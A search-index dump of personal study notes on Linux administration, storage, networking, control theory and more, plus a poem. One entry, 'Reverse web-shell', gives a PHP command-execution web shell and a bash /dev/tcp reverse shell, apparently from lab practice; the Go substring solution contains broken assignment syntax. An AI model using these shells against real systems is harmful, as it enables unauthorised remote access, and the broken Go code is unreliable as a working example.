VPN</p>"},{"location":"docs/IaaS/","title":"IaaS","text":""},{"location":"docs/IaaS/#infrastructure-as-a-service","title":"Infrastructure as a Service","text":"<p>Alternate Name: HaaS (hardware as a service)</p> <ul> <li>You are still responsible for management and security.</li> </ul> <p>SaaS</p>"},{"location":"docs/Integral_windup/","title":"Integral windup","text":""},{"location":"docs/Integral_windup/#integral-windup","title":"Integral windup","text":"<ul> <li>Theres a huge problem with reducing the error later<ul> <li>It builds staedli and then satuarte the distance &gt;[!tip]-     imagine a drone &gt;When u holding it the error is rising since it     canot achive the desiersed hight &gt;The enging increase there     power &gt;When u lwt it go the speed is to high and so the error     that it canot steadl achive the desierd hight</li> </ul> </li> </ul> <p>==Methods to fix it==</p>"},{"location":"docs/Integral_windup/#clamping","title":"Clamping","text":"<p>Turning the integrator off Baislcy we set up a given error if the error meets its limit must we do not increase It instead we steadly incerase the speed to the point that we can overcome the obstacle (if we reach the max limit we migh consider a slow down lets say or stoping) we slow down the speed so we dont overshoult those 20 km per hour - rember about the non perfect sesnr - Think about the dynaimc error</p> <p></p> <p>[!example]- </p>"},{"location":"docs/Jenkins/","title":"Jenkins","text":"<pre><code>[CI CD](../CI_CD) automation\n</code></pre> <p>Pipleins and so onnn</p>"},{"location":"docs/LDAP/","title":"LDAP","text":"<pre><code>### Lightweight Directory Access Protocol\n</code></pre> <ul> <li>Stores Authentication ,authorization,Identity</li> </ul> <p>AD [[System Auth.canvas|System Auth]]</p>"},{"location":"docs/LVM/","title":"LVM","text":"<p>Best Way to combine storage </p> <p>[!bug] It does not offer data protection If one drive fails the other fail too</p> <p>Accts like a one block devie</p> <p>U can easily both shrink/extend fs and lvvm with <code>--resizefs</code></p> <pre><code>lvresize --resizefs -L +5G /dev/test/lv-data\n</code></pre>"},{"location":"docs/LVM/#commands","title":"Commands","text":"<ul> <li>pv(create display change)    vg(create)</li> <li>lv(create) ### Alternatives are the Raid devices</li> <li></li> </ul>"},{"location":"docs/Latex_syntax/","title":"Latex syntax","text":"symbol syntax(mathjax) $36\\degree$ /degree"},{"location":"docs/Load_Average/","title":"Load Average","text":"<pre><code>The number of currently active and queued processes\n</code></pre> <p>divided by the [[Cpu|Cpu capasity]] (number of cores lscpu)</p> <p>***/proc/cpuinfo ***</p> <p>[!tip] It 1min 5min and 15min </p> <ul> <li>U can find it in #proc /proc/loadavg; #check /proc/cmdline</li> </ul> <p>Also displayed by - uptime - w - top</p>"},{"location":"docs/Localizaiton_time_setup/","title":"Localizaiton time setup","text":"<ul> <li>Synchronizing the time with the rest of the world<ul> <li>NTPD(daemon) Uses     NTP_protocol</li> </ul> </li> <li>Crony for advanced synchronization #sysd_util</li> <li>Timesync<ul> <li>It doesn\u2019t have server component *very simplistic *</li> </ul> </li> </ul>"},{"location":"docs/Localizaiton_time_setup/#command","title":"Command","text":""},{"location":"docs/Localizaiton_time_setup/#sysd_util-localctl","title":"sysd_util - localctl","text":"<pre><code>sudo localectl set-locale LANG: en_US.UTF-8\n</code></pre> <ul> <li>timedatectl</li> </ul>"},{"location":"docs/Login_troubleshooting/","title":"Login troubleshooting","text":"<p>Worth loooking # Troubleshooting procces 1. check last log [[Logging.canvas|Logging]] - last or lastb 2. check if user is created - getent 3. Check gui session - sudo sytemctl status graphical.target</p>"},{"location":"docs/Login_troubleshooting/#tty-issues","title":"Tty issues","text":"<p>U can check weather the terminal sesison where corrupted in #dev /dev/tty - If the file is corupted it will have - in front if c then the file is ok - Use mknod</p> <ul> <li>Check if the     getty     service is up<ul> <li>It\u2019s responsible for the login prompt</li> </ul> </li> </ul>"},{"location":"docs/Login_troubleshooting/#check-if-the-account-is-locked","title":"Check if the account is locked","text":"<pre><code>sudo passwd -S user\n</code></pre>"},{"location":"docs/Login_troubleshooting/#check-for-ulimit","title":"Check for ulimit","text":"<p>ulimit docs</p> <pre><code>ulimit user\n</code></pre>"},{"location":"docs/Loging_linux/","title":"Loging linux","text":"<pre><code>[ssh_LOG](../ssh_LOG)\n</code></pre> <p>Graphana/Loki</p>"},{"location":"docs/Longest_Sub_string_Without_Repeating_Characters/","title":"Longest Sub string Without Repeating Characters","text":"<pre><code>## Description\n</code></pre> <p>Given a string s, find the length of the longest subsisting without repeating characters.</p>"},{"location":"docs/Longest_Sub_string_Without_Repeating_Characters/#edge-cases","title":"Edge cases","text":"<ul> <li>Length string might be one character</li> </ul>"},{"location":"docs/Longest_Sub_string_Without_Repeating_Characters/#hints","title":"Hints","text":"<ul> <li>We have to track index</li> <li>We can store the character in the set</li> <li>We have to track the max length<ul> <li>if current length &gt; max length max length: current length</li> </ul> </li> </ul>"},{"location":"docs/Longest_Sub_string_Without_Repeating_Characters/#code","title":"Code:","text":"<pre><code>func lengthOfLongestSubstring(s string) int {\n    // Map to store the last index where a character appeared\n    lastSeen := make(map[byte]int)\n\n    // Variables to track the start and end of the window\n    start, maxLen := 0, 0\n\n    // Iterate through the string\n    for end := 0; end &lt; len(s); end++ {\n        // If the character at the end is already in the window,\n        // update the start of the window to the next index of the repeated character\n        if lastIdx, found := lastSeen[s[end]]; found &amp;&amp; lastIdx &gt;= start {\n            start: lastIdx + 1\n        }\n\n        // Update the last seen index of the current character\n        lastSeen[s[end]] = end\n\n        // Update the maximum length if the current substring is longer\n        maxLen: max(maxLen, end-start+1)\n    }\n\n    return maxLen\n}\n</code></pre> <p>[[Algorithms.canvas|Algorithms]]</p>"},{"location":"docs/MAC/","title":"Mandatory Access Control","text":"<p>Docs</p> <ul> <li>Security policies can be set by the system owner and implemented     by a system administrator.</li> </ul> <p>[!bug] Users cannot override set policies, even if they have root privileges.</p> <p>DAC</p> <p>SELinux</p> <p>Orange Book</p> <p>Kernel</p>"},{"location":"docs/MAN_PAGE/","title":"MAN PAGE","text":"<ul> <li>The location of them is held in $MANPATH</li> </ul> <p>Manual page structure </p>"},{"location":"docs/MAN_PAGE/#useful-commands","title":"Useful commands","text":"<ul> <li><code>-k</code><ul> <li>search across all manual page names and descriptions to find a     specific keyword (man \u2013k \u2033remove empty\u2033)</li> </ul> </li> </ul> <p>Baisic Linux commands</p>"},{"location":"docs/Multipath/","title":"Multipath","text":""},{"location":"docs/Multipath/#multipath-technique","title":"Multipath Technique","text":"<ul> <li>Having multiple routes between servers and storage, helping keep     things running smoothly even if one path goes     down. &gt;[!example] &gt;If one of the swithces fails the other takes it     place &gt;since the controler is connected to     both &gt; &gt;MULITIPATHGRAPH_visual.png</li> </ul> <p>SAN iSCSI</p>"},{"location":"docs/NVMe/","title":"Non-Volatile Memory Host","text":"<p>I\u2019ts an interface - Fastest response for the computers that use PCIe - It uses flash memory chips unlike spinning disk - Enables SSD to connect to Cpu</p>"},{"location":"docs/NVMe/#best-for","title":"Best for","text":"<ul> <li>Used in data centers and super computers<ul> <li>Enterprise workload</li> <li>AI</li> <li>Machine learning</li> <li>Real-time analytics</li> <li>Development operations</li> </ul> </li> </ul>"},{"location":"docs/Nagle%27s_Algorithm/","title":"Nagle\u2019s Algorithm (TCP)","text":"<ul> <li>Purpose: Reduces the number of small packets on the network by     combining small messages.</li> <li>Problem: Sending many tiny packets can inefficiently use     bandwidth.</li> </ul> <p>Mechanism: 1. Buffer: If unacknowledged data is in flight, new small messages are buffered. 2. Transmit when: - Previous data is acknowledged. - Buffer fills up to the maximum segment size. - A timer expires (typically 200 ms).</p> <p>To Disable: Use the <code>TCP_NODELAY</code> socket option. Useful for applications where low latency is more critical than efficient bandwidth use.</p> <p>HTTP Ports Bandwidth</p>"},{"location":"docs/Nagles_Algorithm/","title":"Nagle\u2019s Algorithm (TCP)","text":"<ul> <li>Purpose: Reduces the number of small packets on the network by     combining small messages.</li> <li>Problem: Sending many tiny packets can inefficiently use     bandwidth.</li> </ul> <p>Mechanism: 1. Buffer: If unacknowledged data is in flight, new small messages are buffered. 2. Transmit when: - Previous data is acknowledged. - Buffer fills up to the maximum segment size. - A timer expires (typically 200 ms).</p> <p>To Disable: Use the <code>TCP_NODELAY</code> socket option. Useful for applications where low latency is more critical than efficient bandwidth use.</p> <p>HTTP Ports Bandwidth</p>"},{"location":"docs/Namespaces/","title":"Namespaces","text":"<p>### Namespaces </p> <p>Limits what u can see (and therefore use) -   The processes only see what\u2019s is in the naimespaces -   it can be users     -   the process has no idea it\u2019s ruining under one it only knows         about the resources</p> <ul> <li>Heavily used in Kubernetes Namespaces</li> </ul> <p>[!tip] The first instance of namespaces Te where used by programing language to build varaibles that refer to the memory location - refer to it as a name - later we can give it a type</p> <p>YtVideo</p> <p>cgroups Kernel docker</p>"},{"location":"docs/OOM_process_Killer/","title":"OOM process Killer","text":"<ul> <li>The system scores each process by how much the system would gain     from eliminating it.<ul> <li>Finally, when it comes to the low memory state, the kernel kills     the process of the highest score.</li> <li>The score is located in /proc/PID/oom_score</li> </ul> </li> </ul>"},{"location":"docs/OOM_process_Killer/#controlling-oom","title":"Controlling OOm","text":"<p>Docs - With choom</p> <pre><code>choom -n 300 firefox\n</code></pre>"},{"location":"docs/OOM_process_Killer/#etc-using-etc-etcsystemd","title":"etc - Using etc /etc/systemd","text":"<p>[!example] </p>"},{"location":"docs/OOM_process_Killer/#processes-over-allocation","title":"Processes over-allocation","text":"<ul> <li>When process starts it usually request more memory from the then     it need kernel<ul> <li>Kernel knows about it     so it over allocates the memory<ul> <li>It may allocate 8.5Gb in a 8Gb system</li> </ul> </li> </ul> </li> </ul>"},{"location":"docs/PAM/","title":"PAM","text":""},{"location":"docs/PAM/#pluggable-authentication-modules","title":"Pluggable Authentication Modules","text":"<ul> <li>It\u2019 allows to use various auth methods<ul> <li>like LDAP database or AD</li> </ul> </li> </ul> <p>SSSD [[System Auth.canvas|System Auth]] orange book</p>"},{"location":"docs/PID_control/","title":"PID control","text":""},{"location":"docs/PID_control/#proportional-integral-derivative-contorler","title":"Proportional Integral Derivative Contorler","text":"<p>[!tip]- Main schema </p> <ul> <li>This uses the past error present error and future error to calculate     appropriate commands</li> <li>Schema     </li> </ul>"},{"location":"docs/PID_control/#pid-contor","title":"PID contor","text":"<p>Plant is divided into - ==Acuateres== - Generate the force to change the system - [[process]] - The thing taht actuater is trying to influance</p> <p>[!bug]- Saturation wheh a system meets its limit </p> <p></p>"},{"location":"docs/POETRY_MAIN/","title":"POETRY MAIN","text":"Number Poems 1. BabieLato 2. Eliasz 3. EyesOftheSkin 4. JaPoprowadze 5. NaszeTwarze 6. naInsta 7 NaszeTwarze 8. Nieosiagalne 9. PiszePiewszy 10. przyjaciele 11. zabilemCzlowieka 12. Postcard"},{"location":"docs/PWM_rob/","title":"PWM rob","text":""},{"location":"docs/PWM_rob/#pulse-width-moudlation","title":"Pulse Width Moudlation","text":"<ul> <li>Series of fast pulses that when u avrage them out determines the     voltage the motor sees<ul> <li>The shorter the pulses the slower the motor     </li> </ul> </li> </ul> <p>[!quote] startup_robotics</p>"},{"location":"docs/PaaS/","title":"PaaS","text":""},{"location":"docs/PaaS/#platform-as-a-service","title":"Platform as a service","text":"<ul> <li> <p>No servers No software no maintenance team no HVAC</p> <ul> <li>Heating, Ventilation, and Air Conditioning. It\u2019s a system used     to control the temperature, humidity, and air quality in     buildings.)</li> </ul> </li> <li> <p>You don\u2019t have direct control people or infrastructure</p> </li> <li> <p>Put the building blocks together</p> <ul> <li>Develop your app from whats available on the platform</li> </ul> </li> </ul> <p>SaaS IaaS Cloud Models</p>"},{"location":"docs/Partitioning/","title":"Partitioning","text":""},{"location":"docs/Partitioning/#commands-blkid-list-all-the-devices-that-are-being-in-used","title":"Commands - blkid list all the devices that are being in used","text":"<p>currently - lbsk list block devices - -e to exclude things like snap - lsscsi It displays a list of SCSI devices connected to the system, (such as disk, CD/DVD drive, or tape drive) - fdisk tool to partiont - fcstat Show the fiber connected devices - resize2fs to resize the partiton(without arguments it fills up the entire partion)</p> <p>[!bug] Remeber to partprobe after changenig to let kernel veryfie</p>"},{"location":"docs/Partitioning/#chaking-the-size-of-the-diskck-and-fles","title":"Chaking the size of the diskck and fles","text":"<ul> <li>df</li> <li>du</li> </ul>"},{"location":"docs/Partitioning/#partitioning-process","title":"Partitioning process","text":"<p>Inform operating system that the new partiotion where created </p> <pre><code>partprobe\n</code></pre>"},{"location":"docs/Partitioning/#wipefs","title":"Wipefs","text":"<p>Docs</p> <p>The leftower patition issues <pre><code># This only shows what partiontabels are left on the block devcie\nsudo wipefs /dev/sda\n# Output: \n# DEVICE OFFSET TYPE UUID LABEL\n# sda    0x1fe  dos\n# ------------------------------ \n# This wipes of the remaining partitions\nsudo wipefs /dev/sda -a\n</code></pre></p>"},{"location":"docs/PoW_algorithms/","title":"PoW algorithms","text":""},{"location":"docs/PoW_algorithms/#proof-of-work-algorithm","title":"Proof of work algorithm","text":"<ul> <li>Take a currrent block header</li> <li>Append a nonce sterting at nonce: 0</li> <li>Hash data from #1 #2</li> <li>Check hash versus target (provided by protocol)</li> <li>If hash \\&lt; target puzzle is solved<ul> <li>U got reward</li> </ul> </li> <li>Else restart process form step #2 but nonce +=1</li> </ul> <p>[!quote] binary search</p>"},{"location":"docs/Postcard/","title":"Postcard","text":"<pre><code>Postcard\n</code></pre> <p>Some of us are photographers. I only wanted to take a mental note. There\u2019s not much to talk about, Just a few souvenirs, A couple of postcards of what was left.</p> <p>It was never about the people, Although they can\u2019t complain. Their need for attention was always met They were like words, Destroyed when put into definitions.</p> <p>I existed through their character, Their flawed sense of intimacy. I had nothing to share, But they were there.</p> <p>Now there\u2019s only me and the stone, And I can\u2019t take a look at myself\u2026</p>"},{"location":"docs/Puppet/","title":"Puppet","text":"<pre><code>- **Pull model**\n- Ruby based\n</code></pre> <ul> <li>Agent based<ul> <li>Except Puppet Bolt<ul> <li>It\u2019s a tool for routers and switches</li> </ul> </li> </ul> </li> <li>MOM master of masters<ul> <li>Tool that controls all the masters</li> </ul> </li> </ul> <p>[!example]- </p>"},{"location":"docs/Puppet/#configuration","title":"Configuration","text":"<p>The main configuration is Manifest.pp - It has classes that are build of resources - Resources are just service like (apache or docker) - This can be also setup further in module</p> <p>[!example]- </p> <p>vSwitch</p>"},{"location":"docs/Push_vs_Pull_auto/","title":"Push vs Pull_auto","text":"<pre><code>- **Push**\n- Push the integration to the devices\n</code></pre> <ul> <li>Pull<ul> <li>Pull the integration from the master devices</li> </ul> </li> </ul> <p>iaC [[Automation tools.canvas|Automation tools]]</p> Push Pull [[Ansyible]] Puppet Teraform"},{"location":"docs/RAID_0/","title":"RAID 0","text":""},{"location":"docs/RAID_0/#stripe","title":"Stripe","text":"<ul> <li>All of the drives are added together (ex 40 GB)<ul> <li>High space composite</li> <li>When u write a file to the disc array quarter of the files go to     each disk<ul> <li>Extremly fast reads and writes</li> </ul> </li> </ul> </li> </ul> <p>[!bug] It\u2019s vulnerable to the data loss</p> <p>[!example] </p> <p>[[Combining Disks (raid).canvas|Combining Disks (raid)]]</p>"},{"location":"docs/RAID_1/","title":"RAID 1","text":""},{"location":"docs/RAID_1/#mirrored-array","title":"Mirrored Array","text":"<ul> <li>Every single drive is a mirror of the other drives<ul> <li>No speed increase</li> <li>No storage increase</li> </ul> </li> <li>Very good agaisnt data loss &gt;[!example]     </li> </ul> <p>[[Combining Disks (raid).canvas|Combining Disks (raid)]]</p>"},{"location":"docs/RAID_5/","title":"RAID 5","text":"<ul> <li>Storage</li> <li>The total number of drives - one drive</li> <li>Each drive has parity section<ul> <li>Which stores the small part of each data</li> </ul> </li> <li>Fast read and writes</li> <li>U\u2019re able to lose one drive<ul> <li>U can restore the faild one</li> </ul> </li> </ul> <p>[!example] </p> <p>[[Combining Disks (raid).canvas|Combining Disks (raid)]]</p>"},{"location":"docs/RAID_STORAGE/","title":"Raid Devices","text":""},{"location":"docs/RAID_STORAGE/#raid-0-stripe","title":"RAID 0 Stripe","text":"<p>It\u2019s vulnerable to the data loss!!! </p> <ul> <li>All of the drives are added together (ex 40 GB)<ul> <li>High space composite</li> <li>When u write a file to the disc array quarter of the files go to     each disk<ul> <li>Extremly fast reads and writes</li> </ul> </li> </ul> </li> </ul>"},{"location":"docs/RAID_STORAGE/#raid-1-mirrored-array","title":"RAID 1 Mirrored Array","text":"<p>Very good agaisnt data loss </p> <ul> <li>Every single drive is a mirror of the other drives<ul> <li>No speed increase</li> <li>No storage increase</li> </ul> </li> </ul>"},{"location":"docs/RAID_STORAGE/#raid-5","title":"Raid 5","text":"<p>Best of both worlds &gt;</p> <ul> <li>Storage</li> <li>The total number of drives - one drive</li> <li>Each drive has parity section<ul> <li>Which stores the small part of each data</li> </ul> </li> <li>Fast read and writes</li> <li>U\u2019re able to lose one drive<ul> <li>U can restore the faild one</li> </ul> </li> </ul>"},{"location":"docs/RFC_Standard/","title":"RFC Standard","text":"<pre><code>### Request for Comments\n</code></pre> <ul> <li>RFCs serve as the primary means for proposing new standards,     discussing network operations, and sharing information among the     technical community involved in Internet engineering and development</li> </ul>"},{"location":"docs/RPC_calls/","title":"RPC calls","text":""},{"location":"docs/RPC_calls/#remote-procedure-calls","title":"Remote Procedure Calls","text":"<p>Server or a service that allows clients to execute commands or Functions as it they where a part of a native program calling the functions that not at the same computer</p> <p>[!quote]</p>"},{"location":"docs/RPM/","title":"RPM","text":""},{"location":"docs/RPM/#revolutions-per-minute","title":"Revolutions per minute","text":"<p>A unit that measures the rotational speed or the number of times a rotary component completes a full <code>$360\\\\degree$</code> rotation in one minute.</p> <p>When someone says a robot part (like a wheel or a motor) operates at \u201c100 RPM,\u201d they mean that part completes 100 full rotations every minute.</p> <ul> <li>PID_control</li> </ul>"},{"location":"docs/Reiser/","title":"Reiser","text":""},{"location":"docs/Reiser/#reiser","title":"Reiser","text":"<p>alternative to ext4.md</p> <ul> <li>Utilizes Journaling</li> <li>The maximum file size is 8TB</li> <li>The maximum volume size is 16TB</li> </ul> <p>[[Files systems.canvas|File Systems]]</p>"},{"location":"docs/Repository_Configuration/","title":"Repository Configuration","text":"<ul> <li>This specifies which repositories should be used.<ul> <li>If you want to add a repository, simply create a file in     /etc/apt/sources.list.d</li> </ul> </li> </ul> <p>[!example] </p>"},{"location":"docs/Reverse_web-shell/","title":"Reverse web-shell","text":"<pre><code>## Reverse shell\n</code></pre> <ul> <li>By passing the php file we can open the reverse shell</li> </ul> <pre><code>&lt;?php system($_GET[\"cmd\"]);?&gt;\n</code></pre> <ol> <li>Checkout reverse shell</li> <li>Use dev tcp to open the shell since [[netcat]] is not avaiable<ol> <li>ex sh -i &gt;&amp; /dev/tcp/10.10.10.10/9001 0&gt;&amp;1</li> </ol> </li> <li>Create the listner with the [[netcat]]</li> <li>Create a python server that catches the shell and enables     interactivity</li> </ol> <p>[!quote] bash_MAIN</p>"},{"location":"docs/SDN/","title":"SDN","text":""},{"location":"docs/SDN/#software-defined-networking","title":"Software Defined Networking","text":"<p>Networking devices have different functional panes of operation</p> <ul> <li>Data control and management of planes of operation<ul> <li>Split the functions into seprate logical units<ul> <li>Extend the functionality and management of signle device</li> <li>Perfectly built for the cloud</li> </ul> </li> </ul> </li> </ul>"},{"location":"docs/SDN/#infrastructure-layer","title":"Infrastructure Layer","text":"<p>Data plane</p> <ul> <li> <p>Processes networking frames and packets</p> </li> <li> <p>Forwarding trunking encrypting     NAT ###     Control layer / Control plane</p> </li> <li> <p>Manges the action of the data plane</p> </li> <li> <p>Routing tables session tables NAT tables</p> </li> <li> <p>Dynamic routing protocol updates ### Application layer/Management     plane</p> </li> <li> <p>Configure and mange the device</p> </li> </ul> <p></p> <p>[!quote] hypervisor SD-WAN TOCHECK:virtual_server</p>"},{"location":"docs/SELinux/","title":"Security enhanced Linux","text":"<p>Define on every file what are they allowed to access ## Contianers [Selinux Containers]({{\\&lt; ref \u201cposts/redhat/selinux_containers.md\u201d&gt;}})</p>","tags":["selinux","RHEL"]},{"location":"docs/SELinux/#policies","title":"Policies","text":"<p>[Selinux Policies]({{\\&lt; ref \u201cposts/redhat/selinux_policies.md\u201d&gt;}})</p>","tags":["selinux","RHEL"]},{"location":"docs/SELinux/#modes","title":"Modes","text":"<pre><code>sestatus\n</code></pre> <ul> <li>Enforcing checking the attribute of the files does\u2019t let them     access it</li> <li>Permissive Only logs the check</li> <li>Disabled</li> </ul>","tags":["selinux","RHEL"]},{"location":"docs/SELinux/#types","title":"Types","text":"<ul> <li> <p>Targeted Targeted processes are protected</p> </li> <li> <p>Minimum Only selected processes are targeted</p> </li> <li> <p>Mls Multi Level security protection &gt;[!example]- &gt;          ### Labels &gt;[!example] It\u2019s a label on the     file &gt;</p> </li> <li> <p>User User mapped to the Selinux</p> </li> <li> <p>Role What a user or daemon can do with the file</p> </li> <li> <p>Type What kind of object is it</p> <ul> <li>It\u2019t insert context on a new file not if the file is moved</li> </ul> </li> <li> <p>Sensitivity level Only in Mls</p> </li> <li> <p>To display it</p> </li> </ul> <pre><code>ls -lZ\n</code></pre>","tags":["selinux","RHEL"]},{"location":"docs/SELinux/#changing-context","title":"Changing context","text":"<ul> <li>chcon Changes the type for new</li> </ul> <pre><code>chcon -t httpd_sys file\n</code></pre> <ul> <li>restorecon<ul> <li>set\u2019s the proper context for the file</li> </ul> </li> </ul> <pre><code>restorecon -R *\n</code></pre> <p>[!tip] To change the conetex for all the files add /.autorelable</p>","tags":["selinux","RHEL"]},{"location":"docs/SELinux/#logging","title":"Logging","text":"<p>Troubelshootig Selinux Logs</p> <p>Hole SELinux message can usually be spotted via journalctl and searching for SELinux.</p> <pre><code># It's the current boot session \njournalctl -b 0\n</code></pre> <p>Or to use what journalctl uses under the hood, which is <code>/var/log/messages</code>.</p> <p>The other way around is if the auditd is enabled.</p> <pre><code># This will list selinux messages \nausearch -m avc\n\n# or \ngrep \"denied\"/var/log/audit/audit.log\n</code></pre>","tags":["selinux","RHEL"]},{"location":"docs/SELinux/#updating-policies","title":"Updating Policies","text":"<p>[Selinux Policies]({{\\&lt; ref \u201cposts/redhat/selinux_policies.md\u201d&gt;}})</p> <p>Occasionally, programs may attempt to access different user contents using their policies. However, SELinux may block such attempts, even when the set option is correct. In such cases, you need to adjust the SELinux boolean settings.</p> <pre><code>semanage boolead --modyfie --on options\n</code></pre> <p>AppArmor</p>","tags":["selinux","RHEL"]},{"location":"docs/SMB/","title":"SMB","text":"<pre><code>### Server Message Block\n</code></pre> <p>__ Port 445 __ - used with devices like (printers routers used in windows)</p>"},{"location":"docs/SMB/#the-name-common-internet-file-system-cifs","title":"the name Common Internet File System (CIFS)","text":"<ul> <li>Which was subsequently used as a synonym for the SMB protocol     family.<ul> <li>Today, CIFS is particularly common as a term for the first     SMB version 1.0.(don\u2019t use this version on windows)</li> <li>However CIFS utils on linux uses the lates SMB     version<ul> <li>explanation</li> </ul> </li> </ul> </li> </ul>"},{"location":"docs/SMB/#how-does-smb-work","title":"How does SMB work?","text":"<ul> <li>Uses TCP (/3 way hand shake)</li> </ul> <p>[!quote] ports SMB client Samba</p>"},{"location":"docs/SMB_client/","title":"SMB client","text":"<pre><code>### [SMB](../SMB) CLient\n</code></pre> <p>$IPC means that this is the admistrative account</p> <p>Allows u to connect to SMB  &gt;[!quote] Docs</p>"},{"location":"docs/SNIPPETS_MAIN/","title":"SNIPPETS MAIN","text":"Function location setup poetry with docker* poetry_docker_snippets nix temp for python projects nix Templates nix temp shell mkShell_nix solana defult instructions solana-rs default flake flake scrript to backup flake repo backup_flake_script img upload svelte upload img svelte_snippet aws cloud watch ec2 config upload img svelte_snippet"},{"location":"docs/SSD/","title":"SSD","text":""},{"location":"docs/SSD/#solid-state-drive-ssd","title":"Solid-State Drive (SSD)","text":""},{"location":"docs/SSD/#block_devblock-devices-limitations","title":"[[Block_dev|Block Devices]] Limitations","text":"<ul> <li>Data can be read only on empty [[Block_dev#page|pages]].</li> <li>Erasing can only be done at the [[Block_dev|block level]].</li> </ul>"},{"location":"docs/SSD/#trimming","title":"Trimming","text":"<p>TRIM is a command that allows the operating system to inform the solid-state drive ({{\\&lt; ref \u201cposts/SSD.md\u201d &gt;}}) which data blocks are no longer needed and can be deleted or marked as free for rewriting. - Instead of deleting whole blocks of memory, TRIM enables deletion at the [[Block_dev#page|page level]]. - Whenever a delete command is issued by the operating system or the user, the SSD automatically sends a TRIM command to wipe the storage space being erased.</p> <p>[!tip] To enable it permanently, modify /etc/fstab and add the discard option. </p> <ul> <li> <p>To run it manually:</p> <pre><code>sudo fstrim -v\n</code></pre> </li> </ul> <p>Docs</p> <p>[j[[Automatic Mounting fstab|fstab]]]</p>"},{"location":"docs/SSD/#benefits","title":"Benefits","text":"<ul> <li>Prevents rapid wear of the flash memory chips inside the     SSD.</li> <li>Faster reading and writing speeds.</li> </ul> <p>NVMe</p>"},{"location":"docs/SSSD/","title":"SSSD","text":"<pre><code>### System Seciruty Deamon\n</code></pre> <ul> <li> <p>It allows to setup multiple auth options(for different services)</p> </li> <li> <p>Caches passwords (so u can login even if the internet is down)</p> </li> <li> </li> </ul>"},{"location":"docs/SSSD/#popularized-by-red-hat","title":"Popularized by red hat","text":"<p>PAM [[Auth methods.canvas|Auth methods]]</p>"},{"location":"docs/SaaS/","title":"SaaS","text":""},{"location":"docs/SaaS/#softwere-a-service","title":"Softwere a service","text":"<ul> <li>No local installation</li> <li>Central managemnt of data and applications</li> <li>A complete application offfering<ul> <li>No develompent work requaierd</li> </ul> </li> </ul> <p>[!quote] IaaS PaaS</p>"},{"location":"docs/Samba/","title":"Samba","text":"<pre><code>- Provides **file and print services interoperability** between Unix and Windows\n- It  uses *Server Message Block* [SMB](../SMB)\n</code></pre> <ul> <li>The printing for Linux is CUPS</li> <li>Require authentication<ul> <li>U can pass it to the file</li> </ul> </li> </ul> <p>[[Smb#the name Common Internet File System (CIFS)|CIFS]]</p>"},{"location":"docs/Solana/","title":"Solana","text":""},{"location":"docs/Solana/#solana","title":"Solana","text":"<ul> <li>Baisic mechanism<ul> <li>To send tokens u will need your own key pair</li> <li>SOl is the native token<ul> <li>1 billion LAMPORTS</li> </ul> </li> </ul> </li> <li>In order to develop u need to connect to the cluster</li> <li>smart_transactions<ul> <li>the ==first account==is responsible for paying blockchain     transactions fees &gt;[!quote]     RPC_calls smart_transactions</li> </ul> </li> </ul>"},{"location":"docs/Spine_and_leaf_architecture/","title":"Spine and leaf architecture","text":""},{"location":"docs/Spine_and_leaf_architecture/#spine-and-leaf","title":"Spine and Leaf","text":"<ul> <li>Each leaf ==switch== connects to each spine switch<ul> <li>Each spine switch connects to each leaf switch</li> </ul> </li> <li>Leaf switches ==do not== connect to each other Same for switches</li> </ul> <p>[!quote]</p>"},{"location":"docs/Squid/","title":"Squid","text":"<pre><code>### Web Proxy Server\n</code></pre> <p>All the computer are connected to the internet via Proxy Defult Port 3128ports</p>"},{"location":"docs/Squid/#features","title":"Features","text":"<ul> <li>Enabling cache<ul> <li>The proxy service will stored the data on the its own hard drive     so it will speed up the downlowand and lower the bandwidth</li> </ul> </li> <li>Access Control List ACL<ul> <li>Control what pages that can be used (stored in the text file     with squid)</li> </ul> </li> <li>Bypass the fire wall<ul> <li>Conncet to the home server and acces the webiste</li> </ul> </li> </ul> <p>[!quote] NAT proxy</p>"},{"location":"docs/Swap_memory/","title":"Swap memory","text":"<pre><code>[Docs](https://averagelinuxuser.com/linux-swap/G)\n</code></pre> <ul> <li> <p>A partition or a file on a hard drive that helps to allocate     temp memory when ram i exhaust</p> </li> <li> <p>Check the size of the swap with swapon</p> </li> </ul> <p>To create a swap file 1. Create the file</p> <pre><code>sudo fallocater -l 1G /swapfile\n</code></pre> <ol> <li>Change permissions to 600</li> <li>change file to the swapfile</li> </ol> <pre><code>sudo mkswap /swapfile;\nswapon /swapfile\n</code></pre> <ol> <li>edit the [[Automatic Mounting fstab|fstab]]</li> </ol>"},{"location":"docs/Swap_memory/#recommended-swapiness","title":"Recommended swapiness","text":""},{"location":"docs/Swap_memory/#proc-the-default-is-60-but-commended-is-10","title":"proc - The default is 60 but commended is 10","text":"<p>/proc/sys/vm/swappiness</p> <pre><code>#etc\n</code></pre> <ul> <li>To change it edit /etc/[[sysctl|sysctl.conf]]</li> </ul> <p>[!tip]- Swap Recommended size </p>"},{"location":"docs/TLS_session/","title":"TLS session","text":""},{"location":"docs/TLS_session/#tls-session","title":"TLS session","text":"<p>When a connection is established between a client and a server - TLS protocol allows them to negotiate the encryption parameters and establish a secure channel for communication</p> <ol> <li> <p>Handshake: The client and server initiate a TLS handshake.     During this process, they negotiate the TLS version, encryption     algorithms, and other parameters to establish a secure connection.</p> </li> <li> <p>Encryption: Once the handshake is completed, the client and     server use encryption algorithms to encrypt the data being     transmitted between them. This ensures that the data is secure and     cannot be easily intercepted or read by unauthorized parties.</p> </li> <li> <p>Data Transfer: After the TLS session is established, data can be     securely transmitted between the client and server. The encrypted     data is decrypted at the receiving end.</p> </li> <li> <p>Certificate Verification: As part of the TLS handshake, the     server typically presents a digital certificate to the client, which     contains information about the server\u2019s identity. The client can     verify this certificate to ensure it is communicating with the     intended server.</p> </li> </ol> <p>[!quote] TLS_session [[request_journey_backend#Decrytp]]</p>"},{"location":"docs/TMP/","title":"TMP","text":""},{"location":"docs/TMP/#trusted-platform-module","title":"Trusted Platform Module","text":"<p>Specialized hardware component or microcontroller - provides secure cryptographic functions and stores cryptographic keys and measurements to establish and maintain a trusted computing environment.</p>"},{"location":"docs/TMP/#roles-of-tpm","title":"Roles of TPM","text":"<ol> <li> <p>Secure Boot: TPMs can be used to ensure that the system starts     up using trusted and verified software components, preventing     unauthorized or tampered code from running during the boot process.</p> </li> <li> <p>Key Management: TPMs can generate, store, and manage     cryptographic keys securely. These keys can be used for various     purposes, such as encrypting data, signing digital certificates, or     establishing secure connections using protocols like TLS.</p> </li> <li> <p>Remote Attestation: TPMs support a feature called remote     attestation, where a system can prove its integrity and     configuration to a remote party. This can be useful for establishing     trust between systems in 